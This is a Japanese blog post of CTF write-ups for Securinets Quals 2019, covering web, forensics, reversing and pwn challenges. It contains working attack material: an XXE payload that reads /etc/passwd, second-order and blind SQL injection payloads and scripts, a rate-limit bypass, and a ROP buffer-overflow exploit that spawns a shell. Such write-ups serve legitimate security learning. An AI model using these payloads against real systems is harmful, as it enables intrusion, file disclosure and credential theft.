---
layout: post
title: Securinets CTF Quals 2019 の write-up
categories: [ctf]
date: 2019-03-25 07:00:00 +0900
---

3 月 24 日から 3 月 25 日にかけて開催された [Securinets CTF Quals 2019](https://www.facebook.com/Securinets/) に、チーム [zer0pts](https://ctftime.org/team/54599) で参加しました。最終的にチームで 23395 点を獲得し、順位は得点 436 チーム中 2 位でした。うち、私は 10 問を解いて 9605 点を入れました。

他のメンバーの write-up はこちら。

- [Securinets CTF Quals 2019 Writeup - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043)
- [Securinets CTF Quals 2019 writeup - yoshikingのがんばる日記](https://yoshiking.hatenablog.jp/entry/2019/03/25/165855)
- [Securinets Prequals 2K19 writeup - ふるつき](https://furutsuki.hatenablog.com/entry/2019/03/25/214238)

以下、私が解いた問題の write-up です。

## Web
### Feedback (731)
> I created this website to get your feedback on our CTF.
> Can you check if it's secure ?
> Ps: flag stored in "flag" file

与えられた URL にアクセスすると、 `Full Name` `E-mail` `Feedback` の 3 つの入力欄のあるフォームが表示されました。適当な内容を入力して送信すると、`feed.php` に対して以下のような内容の POST がされました。

```xml
<?xml version="1.0" encoding="UTF-8"?><feedback><author>test</author><email>test@example.com</email><content>undefined</content></feedback>
```

どうやら XML のようです。XML と聞いて思い出すのが XXE (XML External Entity) を使った攻撃です。[XXE攻撃 基本編 \| MBSD Blog](https://www.mbsd.jp/blog/20171130.html) を参考に適当なファイルを読んでみましょう。

```
$ curl 'https://web2.ctfsecurinets.com/feed.php' --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE feedback [<!ENTITY h SYSTEM "file:///etc/passwd">]><feedback><author>&h;</author><email>b@example.com</email><content>c</content></feedback>'
<h4>Thanks For you Feedback root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
simple_user:x:1000:1000::/home/simple_user:/bin/bash
Debian-exim:x:102:102::/var/spool/exim4:/bin/false
</h4>
```

`/etc/passwd` を読み出すことができました。`flag stored in "flag" file` ということなので、`flag` も読んでみましょう。

```
<h4>Thanks For you Feedback Securinets{Xxe_xXE_@Ll_Th3_W@Y}
</h4>
```

フラグが得られました。

```
Securinets{Xxe_xXE_@Ll_Th3_W@Y}
```

---

というのが想定されていた解法だと思いますが、私が解いたときには設定にミスがあったらしく `/flag` にアクセスするだけでフラグが得られました。

### SQL Injected (984)
> Task url: https://web5.ctfsecurinets.com 
> You can download the source code here
> ps: i don't like the task's name
> 添付ファイル: source.zip (ソースコード)

以下のようなソースコードが与えられました。

`create_db.sql` は DB の構造のようです。

```sql
create database webn;
create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
```

`flags.php` は `$_SESSION['role']`　が `1` のときにアクセスするとフラグが表示されるページのようです。

```php
<?php
session_start();
require_once('./db.php');
require_once('./secret.php');
if(!isset($_SESSION['username'])) {
    header('location: login.php');
    die();
}
?>
︙
<?php
if($_SESSION['role'] === '1') {
?>
    <div class="alert alert-success">
        The flag is: <?php echo $flag ?>
    </div>
<?php
} else {
?>
    <div class="alert alert-danger">
        <strong>Error!</strong> You need to be an admin to access this area
    </div>
<?php
}
?>
︙
```

`index.php` は記事の投稿や表示に利用されるページのようです。

```php
<?php
session_start();
require_once('./db.php');
if(!isset($_SESSION['username'])) {
    header('location: login.php');
    die();
}

if (isset($_POST['post']) && isset($_POST['title'])) {
    if(!empty($_POST['post']) && !empty($_POST['title'])) {
        $success = true;
        $post = mysqli_real_escape_string($conn, $_POST['post']);
        $title = mysqli_real_escape_string($conn, $_POST['title']);
        $sql = "INSERT INTO posts (title, content, date, author) VALUES ('". $title ."', '". $post ."', CURDATE(), '". $_SESSION['username'] ."')";
        try {
            $conn->query($sql);
        } catch(Exception $err) {
            echo 'err: '.$err;
            $success = false;
        }
    } else {
        $success = false;
    }

    if($success) {
        $_SESSION['message'] = "<div class=\"alert alert-success\">
            <strong>Success!</strong> Your post has been saved!
        </div>";
    }
}
if (isset($_POST['post_author'])) {
    $sql = "SELECT * FROM posts WHERE author = '". mysqli_real_escape_string($conn, $_POST['post_author']) ."'";
    try {
        $posts = $conn->query($sql);
    } catch(Exception $err) {
        echo 'err: '.$err;
    }
} else {
    $sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'";
    try {
        $posts = $conn->query($sql);
    } catch(Exception $err) {
        echo 'err: '.$err;
    }
}
?>
︙
```

`login.php` はログイン時に利用するページのようです。

```php
<?php
session_start();
if(isset($_SESSION['username'])) {
    header('location: index.php');
    die();
}
require_once('./db.php');

if (isset($_POST['username']) && !empty($_POST['username']) && isset($_POST['password']) && !empty($_POST['password'])) {
    $username = mysqli_real_escape_string($conn, $_POST['username']);
    $password = mysqli_real_escape_string($conn, $_POST['password']);
    $sql = "SELECT * FROM users WHERE login='". $username ."' and password='". $password ."'";
    $res = $conn->query($sql);
    if($res->num_rows > 0) {
        $user = $res->fetch_assoc();
        $_SESSION['username'] = $user['login'];
        $_SESSION['role'] = $user['role'];
        header('location: index.php');
        die();
    } else {
        $success = false;
    }
}
?>
︙
```

脆弱性を探していきましょう。ユーザ入力はすべて `mysqli_real_escape_string` によってエスケープされており SQLi はできないように思えます。が、エスケープせず SQL に直接変数を結合している箇所が`index.php` にひとつだけあります。

```php
$sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'";
```

`login.php` を見ると、`$_SESSION['username']` はログイン時に DB から引っ張ってきてセットされていることが分かります。

```php
        $user = $res->fetch_assoc();
        $_SESSION['username'] = $user['login'];
```

これらを利用して、`' and 0 union select 1, login, password, 4, 5 from users where role = 1;#` というユーザ名で登録 → ログアウト → 再度ログインという流れで `role` が `1` のユーザの認証情報を得ることができました。

```
Results: 1
root 4
jjLLgTGk3uif2rKBVwqH
By: 5
```

`root` / `jjLLgTGk3uif2rKBVwqH` でログインし `/flags.php` にアクセスするとフラグが得られました。

```
Securinets{5VuCj0JUr43jwQDpncRA}
```

### Beginner's Luck (989)
> Can you help me to win the flag ? I bet you can't ..
> 添付ファイル: files.zip (ソースコード)

以下のようなソースコードが与えられました。

`index.php`

```php
<?php
session_start();
require_once ("bd.php");

function generateRandomToken($length)
	{
		//generate random token
	}

if (!isset($_SESSION['count']))
	{
	$_SESSION['count'] = 0;
	$pass = generateRandomToken(100);
	$ip = $_SERVER['REMOTE_ADDR'];
	$sql = "INSERT INTO users (ip, token) VALUES (?,?)";
	$stmt = $pdo->prepare($sql);
	$stmt->execute([$ip, $pass]);
	}

header("Location:play.php");
```

`play.php`

```php
<?php
$max_count = 10;

if (!isset($_SESSION['count']))
	{
	echo "<h1>Session Expired ! Please click <a href='start.php'></h1> here</a> ";
	die();
	}

require_once ("task_bd.php");

$currentValue = '';

if (isset($_POST["val"]))
	{
	if ($_SESSION['count'] >= $max_count)
		{
		header("Location:reset.php");
		die();
		}

	$_SESSION['count']++;
	try
		{
		$sql = "SELECT * FROM users WHERE ip='" . $_SERVER['REMOTE_ADDR'] . "' AND token='" . $_POST['val'] . "'";
		$result = $conn->query($sql);
		if ($result)
			{
			$row = $result->fetch_assoc();
			}
		  else
			{
			$row = false;
			}
		}

	catch(PDOException $e)
		{

		// echo $e;

		}

	if ($row)
		{
		echo "<h1>True</h1>";
		echo "<div><h4>Click <a href='flag.php'>here</a> and use the token to get your flag</h4></div>";
		}
	  else
		{
		echo "<h4>Better luck next time !</h4>";
		}

	$currentValue = $_POST['val'];
	}

echo "<h3>Attempt: " . ($_SESSION['count']) . " / " . $max_count . "</h2><br />";
?>
```

`reset.php`

```php
<?php

session_start();
session_unset(); 
session_destroy();
require_once("bd.php");
		$sql = 'DELETE FROM users '
                . 'WHERE ip = ?';
 
        $stmt = $pdo->prepare($sql);

        $stmt->execute([$_SERVER['REMOTE_ADDR']]);
?>
```

IP アドレスごとに設定されている 100 文字の `token` を 10 回以内に当てられればフラグが得られるというプログラムのようです。

`play.php` の `$sql = "SELECT * FROM users WHERE ip='" . $_SERVER['REMOTE_ADDR'] . "' AND token='" . $_POST['val'] . "'";` で SQLi ができますが、クエリの結果はその成否しか得ることができません。Blind SQLi で `token` を特定しようにも、10 回の試行で 100 文字というのは現実的ではありません。

ですが、`token` は DB に IP アドレス単位で、試行のカウントはセッション ID 単位で管理されていることを利用して 10 回という上限を無視することができます。具体的には、2 つのグローバル IP アドレスを用意し、一方の IP アドレスで Blind SQLi を行いながら、もう一方の IP アドレスを使って同じセッション ID で `reset.php` を叩くことで実現することができます。

以下の `reset.py` と `solver.py` を別々の IP アドレスで実行すると `token` を得ることができ、これを `flag.php` に入力することでフラグが得られました。

`reset.py` (カウントのリセット用)

```python
from flask import *
import requests

app = Flask(__name__)
URL = 'https://web4.ctfsecurinets.com/'

@app.route('/reset', methods=['POST'])
def reset():
  if request.method == 'POST':
    cookies = {'PHPSESSID': request.form['sessid']}
    requests.get(URL + 'reset.php', cookies=cookies)
    requests.get(URL, cookies=cookies)
    return 'ok'

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=8080, threaded=True)
```

`solver.py`

```python
import json
import requests

URL = 'https://web4.ctfsecurinets.com/'
ip_addr = json.loads(requests.get('http://inet-ip.info/json/indent').content)['IP']

sess = requests.Session()
sess.get(URL + 'reset.php')
sess.get(URL)
sessid = sess.cookies['PHPSESSID']
print('PHPSESSID', sessid)

def reset():
  requests.post('http://…/reset', data={
    'sessid': sessid
  })

cnt = 0
def query(q):
  global cnt
  if cnt % 10 == 0:
    reset()

  payload = "' or ip = '{}' and {};#".format(ip_addr, q)
  r = sess.post(URL + 'play.php', data={
    'val': payload
  }).content.decode('ascii')

  assert '502 Bad Gateway' not in r

  cnt += 1
  return r

token = ''
i = len(token) + 1
while True:
  c = 0

  for j in range(7):
    if 'get your flag' in query('(ord(substr(token,{},1))&{})'.format(i, 1 << j)):
      c |= 1 << j

  token += chr(c)
  print(i, repr(token))
  i += 1
```

```
Securinets{GG_uMadeIT_BLiIiND_M@N}
```

## Forensic
### Contact Me (954)
> People think it's hard to stay without a phone, but I don't! My computer has everything a smartphone has like browsers, notes, calendars, and a lot more.
> 添付ファイル: contact_me

`contact_me` という謎のバイナリファイルが与えられました。バイナリエディタで開き `securinet` を検索すると、その前後に `c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0` という文字列がありました。これを Base64 デコードするとフラグが得られました。

```
securinets{31012e16c3e5dfa7e673612d7d075715}
```

### Rare to Win (992)
> I was browsing the web and suddenly my mouse started moving on it's own! I think I have a virus on my computer. UPDATE: I tired some AVs but didn't get a hit, looks like the hacker's payload is clean and undetectable.
> flag: securinets{md5(full_path_to_virus)}
> 添付ファイル: raretowin.raw

謎のメモリダンプが与えられました。[Volatility](https://www.volatilityfoundation.org/) を使って `pstree` でどのようなプロセスが動いていたか確認してみます。

```
>volatility_2.6_win64_standalone.exe -f raretowin.raw --profile Win7SP1x64 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
︙
 0xfffffa8001743670:chrome.exe                       2912   2756     43   1020 2019-03-23 20:45:11 UTC+0000
. 0xfffffa80024e9060:chrome.exe                      2656   2912      2     58 2019-03-23 20:45:13 UTC+0000
. 0xfffffa8000e5e060:chrome.exe                      2652   2912      9    166 2019-03-23 20:45:23 UTC+0000
. 0xfffffa8000e34060:chrome.exe                      2972   2912     15    233 2019-03-23 20:45:37 UTC+0000
. 0xfffffa8001ae8b30:chrome.exe                      1220   2912      0 ------ 2019-03-23 20:46:22 UTC+0000
. 0xfffffa8000f16060:chrome.exe                      1096   2912     14    174 2019-03-23 20:47:31 UTC+0000
. 0xfffffa80007c5b30:chrome.exe                      2908   2912      0 ------ 2019-03-23 20:46:50 UTC+0000
. 0xfffffa80007bdb30:chrome.exe                      2744   2912      8     86 2019-03-23 20:45:11 UTC+0000
. 0xfffffa8000e712f0:chrome.exe                      2704   2912      0 ------ 2019-03-23 20:46:50 UTC+0000
. 0xfffffa80018d87a0:chrome.exe                      2792   2912      0 ------ 2019-03-23 20:47:12 UTC+0000
. 0xfffffa8000e03060:chrome.exe                      2224   2912     15    177 2019-03-23 20:47:31 UTC+0000
. 0xfffffa80023e3400:chrome.exe                      1248   2912     15    192 2019-03-23 20:46:26 UTC+0000
. 0xfffffa8000e51b30:chrome.exe                      1704   2912      0 ------ 2019-03-23 20:47:08 UTC+0000
. 0xfffffa8000e7b060:chrome.exe                      2740   2912      0 ------ 2019-03-23 20:46:59 UTC+0000
︙
```

問題文にも書かれているように、Google Chrome を使って Web ブラウジングをしていたようです。`dumpfiles` で `History` を抽出し、どのようなサイトを閲覧していたか確認しましょう。

```
>volatility_2.6_win64_standalone.exe -f raretowin.raw --profile Win7SP1x64 dumpfiles -D output/ -r "History$"
>strings History
︙
https://…/music.rar/file#music
︙
```

オンラインストレージサービスを使って `music.rar` というファイルをダウンロードしていたようです。このファイルを取得し、どのようなファイルか確認してみましょう。

```
>file music.rar
music.rar: ACE archive data version 20, from Win/32, version 20 to extract, contains AV-String (unregistered), solid
```

ACE というファイル圧縮形式のようです。[droe/acefile](https://github.com/droe/acefile) を使って何が含まれているか確認します。

```
>acefile-unace -lv music.rar
processing archive music.rar
loaded 1 volume(s) starting at volume 0
archive is not locked, not multi-volume, solid
last modified 2019-02-22 03:00:32
created on Win32 with ACE 2.0 for extraction with 2.0+
advert [*UNREGISTERED VERSION*]
CQD FES      size     packed   rel  timestamp            filename
03a f          53         53  100%  2019-02-21 22:03:06  readme.txt
︙
03a f        8416       8416  100%  2019-02-21 22:03:06  C\Users\Public\Data\firefox.exe
```

`firefox.exe` がおそらく問題文で言及されているウイルスでしょう。`securinets{md5(full_path_to_virus)}` がフラグの形式ということなので、`md5('C:\Users\Public\Data\firefox.exe')` を `securinets{}` で囲むとフラグが得られました。

```
securinets{914353ebe43063302e511551e8782352}
```

## Reversing
### Vectors (998)
> Vectors are useful sometimes right ?
> 添付ファイル: bin, test (bin でエンコードされたフラグ?)

`test` の内容とフラグの形式である `securinets{` を xor してみましょう。

```
$ python
>>> from pwn import *
>>> s = open('test', 'rb').read()
>>> xor(s, 'securinets{')
'\xef\xbe\xad\xde\xed\r\x0c\xef\xbe\xad\xde\xc8[\x0c\xee\xfc\xb6\x85\xd7M-\xa7\x92\x9d\xce\xab\x19\x10\xcd\xa6'
```

`\xef\xbe\xad\xde…` が 2 度繰り返されています。これと `test` の内容を xor してみましょう。

```
>>> xor(s, '\xef\xbe\xad\xde\xed\x0d\x0c')
'securinets{V3ct0r5_4R3_Us3fuL}'
```

フラグが得られました。

```
securinets{V3ct0r5_4R3_Us3fuL}
```

### Matrix of Hell! (992)
> HELL!
> Ps: flag is not on the standard format!
> 添付ファイル: rev

`rev` がどのようなファイルか `file` で確認してみましょう。

```
>file rev
rev: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ee0928aaada774031b0fa4517dbcaa1de063d67, stripped
```

x86_64 の ELF のようです。とりあえず実行してみましょう。

```
$ ./rev 
PASSWORD:hoge
ACCESS DENIED
$ ltrace ./rev
printf("PASSWORD:")                                                                                                  = 9
gets(0x7f46b6deb0a0, 58, 0, 0PASSWORD:hoge
)                                                                                       = 0x7f46b6deb0a0
strlen("hoge")                                                                                                       = 4
printf("ACCESS DENIED")                                                                                              = 13
exit(0ACCESS DENIED <no return ...>
+++ exited (status 0) +++
```

パスワードが要求されました。入力されたパスワードは `strlen` に投げられているので、文字数のチェックが行われていることが推測できます。`objdump -d -M intel ./rev` で逆アセンブルし、文字数のチェックを行っている部分を探してみます。

```
︙
 8d4:	48 8d 3d c5 17 20 00 	lea    rdi,[rip+0x2017c5]        # 2020a0 <exit@plt+0x201990>
 8db:	b8 00 00 00 00       	mov    eax,0x0
 8e0:	e8 0b fe ff ff       	call   6f0 <gets@plt>
 8e5:	48 8d 3d b4 17 20 00 	lea    rdi,[rip+0x2017b4]        # 2020a0 <exit@plt+0x201990>
 8ec:	e8 cf fd ff ff       	call   6c0 <strlen@plt>
 8f1:	48 83 f8 0e          	cmp    rax,0xe
 8f5:	75 10                	jne    907 <exit@plt+0x1f7>
︙
```

`strlen(ユーザ入力)` と 0xe が比較されています。パスワードの文字数は 14 文字なのでしょう。14 文字の文字列を適当に投げてみます。

```
$ echo -en "AAAAAAAAAAAAAA" | ltrace ./rev
printf("PASSWORD:")                                                                                                  = 9
gets(0x7fce6df2f0a0, 58, 0, 0)                                                                                       = 0x7fce6df2f0a0
︙
strcmp("B0C2A2C6A3A7C5@6B5F0A4G2B5A2", "A0C2A0C2A0C2A0C2A0C2A0C2A0C2")                                               = 1
printf("ACCESS DENIED")                                                                                              = 13
exit(0PASSWORD:ACCESS DENIED <no return ...>
+++ exited (status 0) +++
$ echo -en "BAAAAAAAAAAAAA" | ltrace ./rev 
printf("PASSWORD:")                                                                                                  = 9
gets(0x7fca21c700a0, 58, 0, 0)                                                                                       = 0x7fca21c700a0
︙
strcmp("B0C2A2C6A3A7C5@6B5F0A4G2B5A2", "A3C2A0C2A0C2A0C2A0C2A0C2A0C2")                                               = 1
printf("ACCESS DENIED")                                                                                              = 13
exit(0PASSWORD:ACCESS DENIED <no return ...>
+++ exited (status 0) +++
$ echo -en "BBAAAAAAAAAAAA" | ltrace ./rev
printf("PASSWORD:")                                                                                                  = 9
gets(0x7f60f2be00a0, 58, 0, 0)                                                                                       = 0x7f60f2be00a0
︙
strcmp("B0C2A2C6A3A7C5@6B5F0A4G2B5A2", "A3C1A0C2A0C2A0C2A0C2A0C2A0C2")                                               = 1
printf("ACCESS DENIED")                                                                                              = 13
exit(0PASSWORD:ACCESS DENIED <no return ...>
+++ exited (status 0) +++
```

`AAAAAAAAAAAAAA` が `A0C2A0C2A0C2A0C2A0C2A0C2A0C2` に、`BAAAAAAAAAAAAA` が `A3C2A0C2A0C2A0C2A0C2A0C2A0C2` に変換されて `B0C2A2C6A3A7C5@6B5F0A4G2B5A2` と比較されているようです。また、`BAAAAAAAAAAAAA` と `BBAAAAAAAAAAAA` の変換後の文字列を比較すると、変化しているのは 3 文字目と 4 文字目だけであり、どうやらユーザ入力がシャッフルされることもなく頭から 1 文字ずつ、一対一で変換しているだろうことが推測できます。1 文字ずつ総当たりしてくれるスクリプトを書いてみましょう。

```bash
#!/bin/bash
res=''

target=$(printf "%-14s\n" TEST | ltrace ./rev 2>&1 | grep strcmp)
target=$(echo -en "$target" | sed -s 's/.*"\([^\)]*\)", "\([^\)]*\)".*/\1/')

for i in {0..13}; do
  for c in {A..Z}; do
    tmp=$(printf "%-14s\n" $res$c | ltrace ./rev 2>&1 | grep strcmp)
    tmp=$(echo -en "$tmp" | sed -s 's/.*"\([^\)]*\)", "\([^\)]*\)".*/\2/')

    if [ "${tmp:i*2:2}" = "${target:i*2:2}" ]; then
      res=$res$c
      echo $res
      break
    fi
  done
done
```

```
$ ./solve.sh
F
FA
FAC
FACE
FACEB
FACEBO
FACEBOO
FACEBOOK
FACEBOOKI
FACEBOOKIS
FACEBOOKISE
FACEBOOKISEV
FACEBOOKISEVI
FACEBOOKISEVIL
$ ./rev 
PASSWORD:FACEBOOKISEVIL
[+]GOOD JOB ! u can submit with this :
1337_FD_DDLLLKMO_KUWRRRVL_HAHAHA
```

フラグが得られました。

```
1337_FD_DDLLLKMO_KUWRRRVL_HAHAHA
```

### RBOOM! (1000)
> can u break the encryption?
> 添付ファイル: rev, la (rev) から参照されている謎のファイル), ll (rev から参照されている謎のファイル)

`rev` がどのようなファイルか `file` で確認してみましょう。

```
>file rev
rev: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b39cd56e12c8db7f014e550436041dd19826352b, stripped
```

x86 の ELF のようです。とりあえず実行してみましょう。

```
$ ./rev
PASSWORD:hoge
:(
$ ltrace ./rev
__libc_start_main(0xf7769ab1, 1, 0xffc9fc94, 0xf7769fa0 <unfinished ...>
ptrace(0, 0, 1, 0)                                                                                                   = 0xffffffff
exit(0 <no return ...>
+++ exited (status 0) +++
```

パスワードの入力が要求されています。また、`ltrace` で呼ばれている関数をチェックしようとしましたが、`ptrace` でデバッガの検知を行っているようで阻まれてしまいました。面倒なので潰してしまいましょう。`objdump -d -M intel ./rev` で逆アセンブルし、`ptrace` を呼び出している箇所を確認します。

```
$ objdump -d -M intel ./rev
︙
     ace:	6a 00                	push   0x0
     ad0:	6a 01                	push   0x1
     ad2:	6a 00                	push   0x0
     ad4:	6a 00                	push   0x0
     ad6:	e8 45 fc ff ff       	call   720 <ptrace@plt>
     adb:	83 c4 10             	add    esp,0x10
     ade:	85 c0                	test   eax,eax
     ae0:	79 0a                	jns    aec <calloc@plt+0x3bc>
     ae2:	83 ec 0c             	sub    esp,0xc
     ae5:	6a 00                	push   0x0
     ae7:	e8 c4 fb ff ff       	call   6b0 <exit@plt>
     aec:	83 ec 0c             	sub    esp,0xc
︙
```

`ptrace` の返り値が負数でないか確認しています。`call ptrace` を `xor eax, eax` に変えてしまいましょう。

`rev` の解析をしていきます。[Ghidra](https://ghidra-sre.org/) でデコンパイルしてみると、`main` と思われる関数の終盤で以下のようにバイト列の比較を行っているのが確認できました。

```c
void FUN_00010ab1(void)
{
︙
  while (local_20 < 0x21) {
    local_1c = local_1c + (int)(char)((&DAT_00013080)[local_20] ^ (&DAT_000130c0)[local_20]);
    local_20 = local_20 + 1;
  }
  if (local_1c == 0) {
    puts(":)");
    puts("submit");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
︙
}
```

このタイミングで `DAT_00013080` と `DAT_000130c0` を見てみましょう。

```
$ gdb ./rev
gdb-peda$ b puts
Breakpoint 1 at 0x6a0
gdb-peda$ r
PASSWORD:securinets{
gdb-peda$ vmmap
Start      End        Perm      Name
0x56555000 0x56557000 r-xp      /…/rev
0x56557000 0x56558000 r--p      /…/rev
0x56558000 0x56559000 rw-p      /…/rev
0x56559000 0x5657a000 rw-p      [heap]
︙
gdb-peda$ x/128bx 0x56558080
0x56558080:     0xe7    0x7d    0xdb    0x6a    0x77    0x9a    0xac    0x37
0x56558088:     0x44    0x99    0x4f    0x16    0xf7    0x70    0x50    0x90
0x56558090:     0xd8    0xd4    0xc6    0xbb    0xb3    0x91    0xcb    0x23
0x56558098:     0xf8    0xf7    0xbc    0x91    0xa7    0x7e    0x84    0x0d
0x565580a0:     0x4f    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580a8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580c0:     0xe7    0x7d    0xdb    0x6a    0x77    0x9a    0xac    0x37
0x565580c8:     0x44    0x99    0x4f    0x4f    0x4f    0x4f    0x4f    0x4f
0x565580d0:     0x4f    0x4f    0x4f    0x4f    0x4f    0x4f    0x4f    0x4f
0x565580d8:     0x4f    0x4f    0x4f    0x4f    0x4f    0x4f    0x4f    0x4f
0x565580e0:     0x4f    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580e8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580f0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x565580f8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

`DAT_00013080` が目標のバイト列、`DAT_000130c0` がユーザ入力が変換されたバイト列のようです。Matrix of Hell! と同じ要領で解けそうです。総当たりしてくれる GDB 向けのスクリプトを書いてみましょう。

```python
import gdb
import re
import string

gdb.execute('set pagination off')
gdb.execute('b puts', to_string=True)

l = 33
gdb.execute('r <<< $(echo hoge)', to_string=True)
target = gdb.execute('x/{}bx 0x56558080'.format(l), to_string=True)
target = ''.join(re.findall(r'0x([0-9a-f]{2})[^0-9a-f]', target)).decode('hex')

key = ''
for i in range(l):
  for c in string.printable.strip():
    tmp = (key + c).ljust(l, 'A')
    with open('input', 'wb') as f:
      f.write(tmp)

    gdb.execute('r < input', to_string=True)
    res = gdb.execute('x/{}bx 0x565580c0'.format(l), to_string=True)
    res = ''.join(re.findall(r'0x([0-9a-f]{2})[^0-9a-f]', res)).decode('hex')
    if res[i] == target[i]:
      key += c
      break

  print '[+]', key

gdb.execute('continue', to_string=True)
gdb.execute('quit')
```

```
$ gdb -n -q -x solver.py ./rev
Reading symbols from ./rev...(no debugging symbols found)...done.
[+] s
[+] se
[+] sec
︙
[+] securinets{rc4_3crypt10n_1s_c00
[+] securinets{rc4_3crypt10n_1s_c00l
```

途切れてしまっていますが、最後の文字は `}` でしょう。

```
$ ./rev 
PASSWORD:securinets{rc4_3crypt10n_1s_c00l}
:)
submit
```

フラグが得られました。

```
securinets{rc4_3crypt10n_1s_c00l}
```

## Pwn
### back to basics (965)
与えられた認証情報を使って問題サーバにアクセスしてみましょう。

```
***************************
Welcome to securinets Quals
***************************
basic@vps614257:~$ uname -a
Linux vps614257 4.4.0-139-generic #165-Ubuntu SMP Wed Oct 24 10:58:50 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
basic@vps614257:~$ id
uid=1022(basic) gid=1022(basic) groups=1022(basic)
basic@vps614257:~$ ls -la
total 84
︙
-r-sr-x---  1 basic-cracked basic          8928 Mar 24 00:31 basic
drwx------  2 basic         basic          4096 Mar 23 23:37 .cache
-r--r-----  1 basic-cracked basic-cracked    27 Mar 24 00:28 flag.txt
︙
```

`basic` からであれば `flag.txt` を読むことができるようです。SCP で `basic` をダウンロードし、解析してみましょう。

```
$ checksec --file ./basic 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
$ objdump -M intel -d basic
︙
0000000000400646 <funcc>:
  400646:	55                   	push   rbp
  400647:	48 89 e5             	mov    rbp,rsp
  40064a:	bf 64 07 40 00       	mov    edi,0x400764
  40064f:	e8 9c fe ff ff       	call   4004f0 <system@plt>
  400654:	90                   	nop
  400655:	5d                   	pop    rbp
  400656:	c3                   	ret    
︙
0000000000400680 <main>:
  400680:	55                   	push   rbp
  400681:	48 89 e5             	mov    rbp,rsp
  400684:	53                   	push   rbx
  400685:	48 81 ec 88 00 00 00 	sub    rsp,0x88
  40068c:	b8 00 00 00 00       	mov    eax,0x0
  400691:	e8 6a fe ff ff       	call   400500 <geteuid@plt>
  400696:	89 c3                	mov    ebx,eax
  400698:	b8 00 00 00 00       	mov    eax,0x0
  40069d:	e8 5e fe ff ff       	call   400500 <geteuid@plt>
  4006a2:	89 de                	mov    esi,ebx
  4006a4:	89 c7                	mov    edi,eax
  4006a6:	b8 00 00 00 00       	mov    eax,0x0
  4006ab:	e8 80 fe ff ff       	call   400530 <setreuid@plt>
  4006b0:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
  4006b7:	48 89 c7             	mov    rdi,rax
  4006ba:	b8 00 00 00 00       	mov    eax,0x0
  4006bf:	e8 5c fe ff ff       	call   400520 <gets@plt>
  4006c4:	b8 00 00 00 00       	mov    eax,0x0
  4006c9:	48 81 c4 88 00 00 00 	add    rsp,0x88
  4006d0:	5b                   	pop    rbx
  4006d1:	5d                   	pop    rbp
  4006d2:	c3                   	ret   
︙ 
```

ユーザ入力に `gets` を使われており、スタックバッファオーバーフローができそうです。`system` 関数も用意されているので、`gets` で bss に実行したいコマンドを書き込み、これを `system` に与える感じでやってみましょう。

```
$ rp++ --file ./basic --rop 3 | grep rdi
0x00400743: pop rdi ; ret  ;  (1 found)
$ gdb ./basic
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x4004f0 <system@plt>
gdb-peda$ p gets
$2 = {<text variable, no debug info>} 0x400520 <gets@plt>
$ readelf -S ./basic | grep bss
  [26] .bss              NOBITS           000000000060107b  0000107b
```

```
basic@vps614257:/tmp/nekoneko$ cat s.py
import struct
import sys

addr_bss = 0x60107b
addr_gets = 0x400520
addr_system = 0x4004f0
addr_pop_rdi = 0x00400743

p64 = lambda x: struct.pack('<Q', x)

payload = 'A' * 152 + p64(addr_pop_rdi) + p64(addr_bss) + p64(addr_gets) + p64(addr_pop_rdi) + p64(addr_bss) + p64(addr_system)
sys.stdout.write(payload + '\n')
sys.stdout.write('sh\n')
basic@vps614257:/tmp/nekoneko$ (python s.py; cat) | ~/basic
cat ~/flag.txt
